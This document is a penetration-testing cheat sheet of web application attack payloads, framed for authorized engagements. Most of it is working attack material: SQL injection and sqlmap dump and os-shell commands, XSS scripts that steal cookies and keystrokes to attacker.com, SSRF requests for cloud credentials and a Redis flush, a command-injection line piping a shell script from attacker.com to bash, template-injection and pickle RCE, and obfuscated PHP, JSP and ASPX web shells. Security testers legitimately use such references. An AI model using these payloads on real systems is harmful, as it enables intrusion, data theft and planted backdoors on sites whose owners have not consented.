# Web Application Attack Techniques

## Overview

This document covers common web application attack techniques, payloads, and testing methodologies for authorized penetration testing engagements.

---

## OWASP Top 10 (2021)

| Rank | Vulnerability | CWE | Severity |
|------|--------------|-----|----------|
| A01 | Broken Access Control | CWE-284 | Critical |
| A02 | Cryptographic Failures | CWE-327 | Critical |
| A03 | Injection | CWE-79, CWE-89 | Critical |
| A04 | Insecure Design | CWE-501 | High |
| A05 | Security Misconfiguration | CWE-16 | High |
| A06 | Vulnerable Components | CWE-1104 | High |
| A07 | Auth Failures | CWE-287 | Critical |
| A08 | Software Integrity Failures | CWE-494 | High |
| A09 | Logging Failures | CWE-778 | Medium |
| A10 | SSRF | CWE-918 | High |

---

## SQL Injection (SQLi)

### Detection

```
# Basic SQLi Tests
'
"
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
1' ORDER BY 1--+
1' UNION SELECT NULL--
```

### Exploitation Payloads

```sql
-- Union-based SQLi
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, table_name FROM information_schema.tables--
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--

-- Error-based SQLi (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--

-- Blind SQLi (Boolean)
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a'--
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') > 0--

-- Blind SQLi (Time-based)
' AND IF(1=1, SLEEP(5), 0)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
'; WAITFOR DELAY '0:0:5'--

-- Out-of-band (OOB) SQLi
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com\\share'))--
```

### SQLMap Commands

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --batch

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test" --batch

# With cookies/headers
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123" --batch

# Database enumeration
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# OS shell (if possible)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
```

---

## Cross-Site Scripting (XSS)

### Detection Payloads

```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Event handlers -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>

<!-- Without parentheses -->
<img src=x onerror=alert`XSS`>
<svg onload=alert`XSS`>

<!-- Encoded payloads -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;('XSS')>
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

### Advanced XSS Payloads

```javascript
// Cookie stealing
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>

// Keylogger
<script>
document.onkeypress=function(e){
  new Image().src="http://attacker.com/log?k="+e.key;
}
</script>

// DOM manipulation
<script>document.forms[0].action="http://attacker.com/phish"</script>

// BeEF hook
<script src="http://attacker.com:3000/hook.js"></script>

// Bypass CSP with JSONP
<script src="https://trusted.com/jsonp?callback=alert"></script>

// Stored XSS in SVG
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```

### Filter Bypass Techniques

```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Null bytes -->
<scr%00ipt>alert('XSS')</scr%00ipt>

<!-- HTML encoding -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- Double encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Unicode encoding -->
<script>\u0061lert('XSS')</script>

<!-- Using SVG -->
<svg/onload=alert('XSS')>

<!-- Breaking tags -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>

<!-- Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

---

## Server-Side Request Forgery (SSRF)

### Basic SSRF Payloads

```
# Internal network scanning
http://127.0.0.1
http://localhost
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### SSRF Bypass Techniques

```
# URL encoding
http://127.0.0.1 -> http://%31%32%37%2e%30%2e%30%2e%31

# Decimal IP
http://127.0.0.1 -> http://2130706433

# Hex IP
http://127.0.0.1 -> http://0x7f000001

# Octal IP
http://127.0.0.1 -> http://0177.0.0.1

# IPv6
http://[::1]
http://[0:0:0:0:0:0:0:1]

# DNS rebinding
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net

# URL redirect
http://attacker.com/redirect?url=http://169.254.169.254

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/config:set:dir:/var/www/html
```

---

## Insecure Direct Object Reference (IDOR)

### Testing Methodology

```
# Horizontal privilege escalation
GET /api/users/123/profile  -> Change to /api/users/124/profile
GET /documents?id=1001      -> Change to /documents?id=1002

# Vertical privilege escalation
GET /api/users/123/profile  -> GET /api/admin/users/123
POST /api/orders            -> POST /api/admin/orders

# Parameter manipulation
/download?file=report_123.pdf -> /download?file=report_124.pdf
/invoice?id=INV-2024-001      -> /invoice?id=INV-2024-002

# UUID/GUID bruteforce
/api/v1/users/550e8400-e29b-41d4-a716-446655440000

# Encoded IDs
Base64: /profile?id=MTIz -> Decode: 123
Hex: /profile?id=7b -> Decode: 123
```

### Automation Script

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def test_idor(base_url, id_range, headers):
    """Test for IDOR vulnerabilities"""
    vulnerable = []

    def check_id(resource_id):
        url = f"{base_url}/{resource_id}"
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            # Check if accessing other user's data
            if "unauthorized" not in response.text.lower():
                return {"id": resource_id, "status": response.status_code, "size": len(response.text)}
        return None

    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(check_id, id_range)

    for result in results:
        if result:
            vulnerable.append(result)

    return vulnerable

# Usage
headers = {"Authorization": "Bearer user_token"}
vulns = test_idor("https://target.com/api/users", range(1, 1000), headers)
```

---

## Remote Code Execution (RCE)

### Common RCE Vectors

```bash
# Command injection
; ls -la
| cat /etc/passwd
`whoami`
$(id)
&& cat /etc/shadow
|| curl attacker.com/shell.sh | bash

# PHP code injection
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?=`$_GET[0]`?>

# Template injection (SSTI)
# Jinja2
{{config}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Deserialization
# Java
ysoserial CommonsCollections1 'command'

# PHP
O:8:"stdClass":1:{s:4:"test";s:2:"id";}

# Python
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())
```

### Web Shell Payloads

```php
<!-- Minimal PHP webshell -->
<?php system($_REQUEST['cmd']); ?>

<!-- Obfuscated -->
<?php $a='sys'.'tem';$a($_REQUEST['cmd']); ?>

<!-- Base64 encoded -->
<?php eval(base64_decode('c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw==')); ?>
```

```jsp
<!-- JSP webshell -->
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
%>
```

```aspx
<!-- ASPX webshell -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["cmd"];
Process.Start("cmd.exe", "/c " + cmd);
%>
```

---

## Authentication Bypass

### Common Techniques

```
# Default credentials
admin:admin
admin:password
root:root
test:test

# SQL injection in login
' OR 1=1--
' OR '1'='1'--
admin'--
admin' #

# Response manipulation
Change response from {"success":false} to {"success":true}

# Password reset flaws
/reset?token=123 -> /reset?token=124
/reset?email=victim@target.com&email=attacker@attacker.com

# JWT vulnerabilities
# None algorithm
{"alg":"none","typ":"JWT"}

# Weak secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Algorithm confusion (RS256 -> HS256)
Public key as HMAC secret

# Session fixation
Force session ID before authentication

# Remember me token prediction
Analyze token generation pattern
```

---

## API Security Testing

### REST API Tests

```bash
# Method tampering
GET /api/users     -> POST /api/users
GET /api/users/1   -> DELETE /api/users/1

# Content-type manipulation
Content-Type: application/json -> Content-Type: application/xml

# Version manipulation
/api/v2/users -> /api/v1/users (older, less secure)

# Mass assignment
POST /api/users
{"name":"test", "role":"admin", "isAdmin":true}

# GraphQL introspection
{"query": "{ __schema { types { name } } }"}

# GraphQL injection
{"query": "{ user(id: \"1 OR 1=1\") { name } }"}
```

### API Fuzzing

```python
import requests

endpoints = [
    "/api/users",
    "/api/admin",
    "/api/config",
    "/api/debug",
    "/api/internal",
    "/api/v1",
    "/api/v2",
    "/api/graphql",
    "/api/swagger",
    "/api/docs"
]

methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]

for endpoint in endpoints:
    for method in methods:
        try:
            r = requests.request(method, f"https://target.com{endpoint}", timeout=5)
            if r.status_code not in [404, 405]:
                print(f"[{r.status_code}] {method} {endpoint}")
        except:
            pass
```

---

## Tools Reference

| Category | Tool | Purpose |
|----------|------|---------|
| Proxy | Burp Suite | HTTP interception |
| Scanner | Nuclei | Vulnerability scanning |
| SQLi | SQLMap | SQL injection automation |
| XSS | XSStrike | XSS detection |
| Fuzzer | ffuf | Web fuzzing |
| Crawler | Katana | Web crawling |
| Recon | Amass | Subdomain enumeration |

---

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
